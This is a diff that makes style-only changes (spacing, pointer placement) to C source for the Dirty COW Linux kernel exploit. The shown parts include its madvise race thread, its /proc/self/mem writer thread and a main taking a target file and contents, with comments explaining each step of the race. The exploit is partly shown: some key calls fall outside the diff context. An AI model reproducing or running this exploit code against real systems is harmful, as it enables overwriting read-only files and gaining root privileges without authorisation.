@@ -7,17 +7,16 @@
 #include <pthread.h>
 #include <string.h>
 
-void *map;
+void* map;
 int f;
 struct stat st;
-char *name;
+char* name;
 
-void *madviseThread(void *arg)
+void* madviseThread(void* arg)
 {
-	char *str = (char*)arg;
+	char* str = (char*)arg;
 	int i, c = 0;
-	for (i = 0; i<100000000; i++)
-	{
+	for (i = 0; i < 100000000; i++) {
 		/*
 		You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
 		> This is achieved by racing the madvise(MADV_DONTNEED) system call
@@ -29,9 +28,9 @@ void *madviseThread(void *arg)
 	return NULL;
 }
 
-void *procselfmemThread(void *arg)
+void* procselfmemThread(void* arg)
 {
-	char *str = (char*)arg;
+	char* str = (char*)arg;
 	/*
 	You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
 	>  The in the wild exploit we are aware of doesn't work on Red Hat
@@ -41,7 +40,7 @@ void *procselfmemThread(void *arg)
 	*/
 	int f = open("/proc/self/mem", O_RDWR);
 	int i, c = 0;
-	for (i = 0; i<100000000; i++) {
+	for (i = 0; i < 100000000; i++) {
 		/*
 		You have to reset the file pointer to the memory position.
 		*/
@@ -52,12 +51,12 @@ void *procselfmemThread(void *arg)
 	return NULL;
 }
 
-int main(int argc, char *argv[])
+int main(int argc, char* argv[])
 {
 	/*
 	You have to pass two arguments. File and Contents.
 	*/
-	if (argc<3)return 1;
+	if (argc < 3)return 1;
 	pthread_t pth1, pth2;
 	/*
 	You have to open the file in read only mode.
